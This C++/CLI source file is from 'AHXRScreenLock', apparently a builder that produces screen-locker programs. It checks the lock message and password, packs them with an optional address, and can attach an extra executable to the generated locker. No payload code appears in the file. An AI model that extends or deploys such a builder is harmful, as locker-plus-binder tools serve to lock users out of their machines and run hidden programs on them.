/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include					"build.h"
#include					"settings.h"
#include					"locker.h"
#include					"pack.h"

#include					<string>
#include					<msclr\marshal_cppstd.h>

using namespace				msclr::interop;
using namespace				System;
using namespace				System::Windows::Forms;

#define SHOWBUILDERROR(MSG) { MessageBox::Show(MSG); b_check = true; }
#define TO_STD(a)			marshal_as< std::string >(a)

void validateClientBuild(System::String ^ message, System::String ^ password, System::Windows::Forms::SaveFileDialog ^ saveref, bool showDialog) {
	std::string
		s_msg = marshal_as< std::string >(message),
		s_pw = marshal_as< std::string >(password)
	;

	bool b_check = false;

	if (s_msg.find(PACK_SPLITTER) != std::string::npos || 
		s_msg.find(PACK_OPENER) != std::string::npos || 
		s_msg.find(PACK_CLOSER) != std::string::npos
	)
		SHOWBUILDERROR(ERROR_MSG_1);
	if (s_msg.length() <= 0)
		SHOWBUILDERROR(ERROR_MSG_2);
	if (s_pw.length() <= 0)
		SHOWBUILDERROR(ERROR_MSG_3);

	if (!b_check && showDialog)
		saveref->ShowDialog();
}

void createClientLocker(System::String ^ fileName, System::String ^ password, System::String ^ message, System::String ^ exe, System::String ^ address, bool exith) {
	std::string s_file_name = TO_STD(fileName);
	buildNewLocker(s_file_name);

	if (address->Length >= 0)
		packLocker(s_file_name, TO_STD(password), TO_STD(message), TO_STD(address));
	else
		packLocker(s_file_name, TO_STD(password), TO_STD(message));

	if (exe->Length >= 0) {
		std::string s_exe = TO_STD(exe);

		if (s_exe.length() > 0 || !s_exe.empty())
			attachExecutable(s_file_name, TO_STD(exe));
	}

	if (exith) exit(0);
}